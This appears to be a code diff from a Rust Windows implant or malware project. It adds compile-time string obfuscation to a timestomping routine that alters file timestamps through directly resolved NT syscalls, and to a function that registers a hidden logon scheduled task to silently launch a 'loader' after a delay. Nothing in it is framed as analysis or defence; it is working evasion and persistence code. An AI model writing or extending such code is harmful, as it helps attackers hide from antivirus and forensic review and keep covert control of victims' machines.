@@ -277,6 +277,7 @@ fn timestomp_file(path: &Path) {
 #[cfg(target_os = "windows")]
 fn timestomp_via_syscall(path_str: &str, windows_time: i64) {
     use dinvk::syscall;
+    use obfstr::obfstr;
     use std::ffi::OsStr;
     use std::os::windows::ffi::OsStrExt;
 
@@ -354,8 +355,10 @@ fn timestomp_via_syscall(path_str: &str, windows_time: i64) {
 
         // Use dinvk syscall! macro for NtOpenFile
         // The macro returns Option<i32> where None means syscall resolution failed
+        // Use obfstr! to obfuscate syscall names at compile time
+        let nt_open_file = obfstr!("NtOpenFile").to_string();
         let status: Option<i32> = syscall!(
-            "NtOpenFile",
+            &nt_open_file,
             &mut handle as *mut *mut std::ffi::c_void,
             FILE_WRITE_ATTRIBUTES,
             &mut object_attrs as *mut ObjectAttributes,
@@ -380,8 +383,9 @@ fn timestomp_via_syscall(path_str: &str, windows_time: i64) {
         };
 
         // Use dinvk syscall! macro for NtSetInformationFile
+        let nt_set_info = obfstr!("NtSetInformationFile").to_string();
         let _set_status: Option<i32> = syscall!(
-            "NtSetInformationFile",
+            &nt_set_info,
             handle,
             &mut io_status as *mut IoStatusBlock,
             &mut file_info as *mut FileBasicInformation,
@@ -390,7 +394,8 @@ fn timestomp_via_syscall(path_str: &str, windows_time: i64) {
         );
 
         // Close handle using NtClose syscall
-        let _close_status: Option<i32> = syscall!("NtClose", handle);
+        let nt_close = obfstr!("NtClose").to_string();
+        let _close_status: Option<i32> = syscall!(&nt_close, handle);
     }
 }
 
@@ -952,9 +957,22 @@ fn generate_task_name() -> String {
 fn create_loader_scheduled_task(task_name: &str, loader_path: &str) -> Result<(), String> {
     let schtasks_exe = obfstr!("schtasks").to_string();
 
+    // Obfuscate schtasks arguments
+    let arg_delete = obfstr!("/Delete").to_string();
+    let arg_tn = obfstr!("/TN").to_string();
+    let arg_f = obfstr!("/F").to_string();
+    let arg_create = obfstr!("/Create").to_string();
+    let arg_sc = obfstr!("/SC").to_string();
+    let arg_onlogon = obfstr!("ONLOGON").to_string();
+    let arg_tr = obfstr!("/TR").to_string();
+    let arg_delay = obfstr!("/DELAY").to_string();
+    let delay_val = obfstr!("0001:00").to_string();
+    let arg_rl = obfstr!("/RL").to_string();
+    let arg_limited = obfstr!("LIMITED").to_string();
+
     // Delete existing task if present (silently)
     let _ = Command::new(&schtasks_exe)
-        .args(["/Delete", "/TN", task_name, "/F"])
+        .args([&arg_delete, &arg_tn, task_name, &arg_f])
         .creation_flags(0x08000000)
         .output();
 
@@ -971,17 +989,44 @@ fn create_loader_scheduled_task(task_name: &str, loader_path: &str) -> Result<()
         return Err("E25: Invalid characters in loader path".to_string());
     }
 
+    // Obfuscate cmd.exe command components
+    let cmd_exe = obfstr!("cmd.exe").to_string();
+    let cmd_c = obfstr!("/c").to_string();
+    let timeout_cmd = obfstr!("timeout").to_string();
+    let timeout_t = obfstr!("/t").to_string();
+    let nobreak = obfstr!("/nobreak").to_string();
+    let start_cmd = obfstr!("start").to_string();
+    let min_flag = obfstr!("/min").to_string();
+
     // Task command with delay and hidden execution
     let task_cmd = format!(
-        r#"cmd.exe /c timeout /t {} /nobreak >nul && start /min "" "{}""#,
-        delay_secs, loader_path
+        r#"{} {} {} {} {} {} >nul && {} {} "" "{}""#,
+        cmd_exe,
+        cmd_c,
+        timeout_cmd,
+        timeout_t,
+        delay_secs,
+        nobreak,
+        start_cmd,
+        min_flag,
+        loader_path
     );
 
     // Create scheduled task on logon with additional delay
     let output = Command::new(&schtasks_exe)
         .args([
-            "/Create", "/SC", "ONLOGON", "/TN", task_name, "/TR", &task_cmd, "/DELAY", "0001:00",
-            "/F", "/RL", "LIMITED",
+            &arg_create,
+            &arg_sc,
+            &arg_onlogon,
+            &arg_tn,
+            task_name,
+            &arg_tr,
+            &task_cmd,
+            &arg_delay,
+            &delay_val,
+            &arg_f,
+            &arg_rl,
+            &arg_limited,
         ])
         .creation_flags(0x08000000)
         .output()
